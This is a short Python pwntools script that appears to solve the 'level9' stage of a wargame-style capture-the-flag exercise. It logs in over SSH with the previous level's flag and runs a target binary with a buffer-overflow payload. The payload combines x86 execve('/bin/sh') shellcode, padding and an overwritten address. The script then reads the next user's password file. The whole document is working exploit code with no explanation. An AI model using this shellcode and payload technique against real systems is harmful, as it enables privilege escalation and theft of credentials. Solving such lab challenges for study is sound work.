#!/usr/bin/env python3

from pwn import *
import os

host = input("Enter host IP: ")
port = int(input("Enter port: "))
login = "level9"
binary = login
target_login = "bonus0"

flag_file = os.path.abspath(os.path.join(os.getcwd(), "level8/flag"))
password = open(flag_file, "r").read().strip()

shell = ssh(host=host, port=port, user=login, password=password)

remotebinary = f"/home/user/{login}/{binary}"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shell_addr = b"\x10\xa0\x04\x08"
padding = b"A" * 76
buffer_addr = b"\x0c\xa0\x04\x08"
payload = shell_addr + shellcode + padding + buffer_addr

p = shell.process([remotebinary, payload])
p.sendline(b"cat /home/user/" + target_login.encode() + b"/.pass")
p.interactive()
